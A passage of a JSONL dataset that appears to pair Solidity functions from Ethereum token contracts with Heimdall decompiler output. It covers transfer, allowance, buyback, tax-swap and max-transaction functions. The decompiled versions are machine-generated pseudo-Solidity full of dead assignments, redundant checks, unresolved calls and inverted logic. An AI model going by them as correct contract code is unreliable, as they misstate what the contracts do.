\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_h) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_t = var_e.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_h) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((arg1 * store_h) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (arg1 - 0) {\n            }\n            if (arg1 - 0) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x19;\n        var_g = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_d / 0x01))) {\n            if (address(arg0) == (address(store_d / 0x01))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {\r\n        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;\r\n    }", "heimdall_decompiled_code": "function set_Max_Transaction_Percent(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (arg0 == ((totalSupply * arg0) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x2710);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        _maxTxAmount = (totalSupply * arg0) / 0x2710;\n    }"}
{"contract_address": "0xbFD03022a32dB1502489AE1F65bd8f343CC09AB9", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_v) {\n            if (store_v - ((store_v / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_v / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_v / 0x02;\n                if (store_v) {\n                    if (store_v - ((store_v / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_v / 0x02) {\n                            if (0x1f < (store_v / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_v / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function buyBackTokens(uint256 amountInWei) external onlyOwner {\r\n        require(amountInWei <= 10 ether, \"May not buy more than 10 ETH in a single buy to reduce sandwich attacks\");\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = dexRouter.WETH();\r\n        path[1] = address(this);\r\n\r\n        // make the swap\r\n        dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountInWei}(\r\n            0, // accept any amount of Ethereum\r\n            path,\r\n            address(0xdead),\r\n            block.timestamp\r\n        );\r\n        emit BuyBackTriggered(amountInWei);\r\n    }", "heimdall_decompiled_code": "function buyBackTokens(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(arg0 > 0x8ac7230489e80000), \"May not buy more than 10 ETH in a single buy to reduce sandwich attacks\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x47;\n        var_d = 0x4d6179206e6f7420627579206d6f7265207468616e2031302045544820696e20;\n        var_e = 0x612073696e676c652062757920746f207265647563652073616e647769636820;\n        var_f = 0x61747461636b7300000000000000000000000000000000000000000000000000;\n        var_a = 0x02;\n        uint256 var_g = var_g + 0x60;\n        var_h = msg.data[4:68];\n        var_i = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(dexRouter).WETH(var_e); // staticcall\n        var_g = var_g + (uint248(ret0.length + 0x1f));\n        require(!((var_g + ret0.length) - var_g) < 0x20);\n        require(var_g.length == (address(var_g.length)));\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x32;\n        uint256 var_l = address(var_g.length);\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x32;\n        address var_m = address(this);\n        var_n = 0xb6f9de9500000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0;\n        var_o = 0x80;\n        uint256 var_p = var_g.length;\n        var_q = 0xdead;\n        uint256 var_r = block.timestamp;\n        require(address(dexRouter).code.length);\n        (bool success, bytes memory ret0) = address(dexRouter).{ value: arg0 }Unresolved_b6f9de95(var_f); // call\n        uint256 var_n = arg0;\n        emit BuyBackTriggered(arg0);\n    }"}
{"contract_address": "0xCe503399D448bC9Ced89D58cf2733BD506f6F27C", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Sniper blocked\");\n        require(address(arg0), \"Sniper blocked\");\n        address var_a = address(msg.sender);\n        var_b = 0x13;\n        require(!(bytes1(storage_map_e[var_a])), \"Sniper blocked\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0e;\n        var_f = 0x536e6970657220626c6f636b6564000000000000000000000000000000000000;\n        require(arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_e[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x22;\n        require(bytes1(storage_map_e[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(arg1 & (sellTotalFees > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyDevFeeg > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_e[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_e[var_a] > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        storage_map_e[var_a] = storage_map_e[var_a] + 0;\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(routerCA / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(buyDevFeeg > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        if (!tradingActive / 0x010000) {\n            if (!tradingActive / 0x010000) {\n                if (!tradingActive / 0x010000) {\n                    if (!tradingActive / 0x010000) {\n                        if (!tradingActive / 0x010000) {\n                        }\n                    }\n                }\n            }\n        }\n        require(bytes1(tradingActive / 0x0100), \"Trading is not active.\");\n        var_a = address(msg.sender);\n        var_b = 0x22;\n        require(bytes1(storage_map_e[var_a]), \"Trading is not active.\");\n        require(bytes1(storage_map_e[var_a]), \"Trading is not active.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x16;\n        var_f = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC2fc9ADEfFc2cF41f12d76ae9eB515289c4cfA6d", "original_solidity_code": "function killEmAll1989() external onlyTrashMan {\r\n        require(!swapEnabled);\r\n        swapEnabled = true;\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        _buyTax=_finalBuyTax;\r\n        _sellTax=_finalSellTax;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function killEmAll1989() public {\n        require(address(_trashMan / 0x01) == (address(msg.sender)), \"You are not trash man\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x15;\n        var_e = 0x596f7520617265206e6f74207472617368206d616e0000000000000000000000;\n        require(!bytes1(store_b / 0x0100000000000000000000000000000000000000000000));\n        store_b = (0x01 * 0x0100000000000000000000000000000000000000000000) | (uint248(store_b));\n        if (0x08) {\n            if (!0x5fa3139c52 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x5fa3139c52;\n                if (0x08) {\n                    if (!0x5fa3139c52 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x5fa3139c52;\n                        _buyTax = 0x01;\n                        _sellTax = 0x01;\n                        if (0x08) {\n                            if (!0x5fa3139c52 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x5fa3139c52;\n                                emit MaxTxAmountUpdated(0x5fa3139c52);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0100 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                        if (!0x08 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0) {\n                                                                    }\n                                                                    if (!0x05f5e100 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > ~(arg1)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_b[var_a] + arg1) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_e[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_e[var_a] = storage_map_e[var_a] - arg1;\n        uint256 var_c = storage_map_e[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2141a81Fbd52a193712C1d77440500e29aB0Fa63", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function MosaicAuthPreserve(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\\r\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\r\\n        unchecked {\\r\\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\\r\\n        }\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function MosaicAuthPreserve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
